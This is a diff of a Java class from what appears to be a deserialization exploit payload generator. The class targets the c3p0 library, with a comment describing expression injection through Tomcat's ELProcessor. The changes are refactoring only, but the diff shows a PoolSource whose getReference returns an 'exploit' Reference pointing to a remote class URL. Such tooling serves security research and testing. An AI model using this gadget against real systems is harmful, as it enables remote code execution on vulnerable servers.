@@ -9,14 +9,11 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 
-import javax.naming.NamingException;
 import javax.naming.Reference;
 import javax.naming.Referenceable;
 import javax.sql.ConnectionPoolDataSource;
 import javax.sql.PooledConnection;
 import java.io.PrintWriter;
-import java.sql.SQLException;
-import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
 
@@ -24,6 +21,7 @@ import java.util.logging.Logger;
  * C3P0 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
  */
 
+@SuppressWarnings({"unused"})
 @Dependencies({"com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8", "com.mchange:mchange-commons-java:0.2.11"})
 @Authors({Authors.MBECHLER})
 public class C3P092 implements ObjectPayload<Object> {
@@ -56,42 +54,42 @@ public class C3P092 implements ObjectPayload<Object> {
 
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
 
-        private String className;
+        private final String className;
 
-        private String url;
+        private final String url;
 
         public PoolSource(String className, String url) {
             this.className = className;
             this.url = url;
         }
 
-        public Reference getReference() throws NamingException {
+        public Reference getReference() {
             return new Reference("exploit", this.className, this.url);
         }
 
-        public PrintWriter getLogWriter() throws SQLException {
+        public PrintWriter getLogWriter() {
             return null;
         }
 
-        public void setLogWriter(PrintWriter out) throws SQLException {
+        public void setLogWriter(PrintWriter out) {
         }
 
-        public int getLoginTimeout() throws SQLException {
+        public int getLoginTimeout() {
             return 0;
         }
 
-        public void setLoginTimeout(int seconds) throws SQLException {
+        public void setLoginTimeout(int seconds) {
         }
 
-        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
+        public Logger getParentLogger() {
             return null;
         }
 
-        public PooledConnection getPooledConnection() throws SQLException {
+        public PooledConnection getPooledConnection() {
             return null;
         }
 
-        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
+        public PooledConnection getPooledConnection(String user, String password) {
             return null;
         }
     }
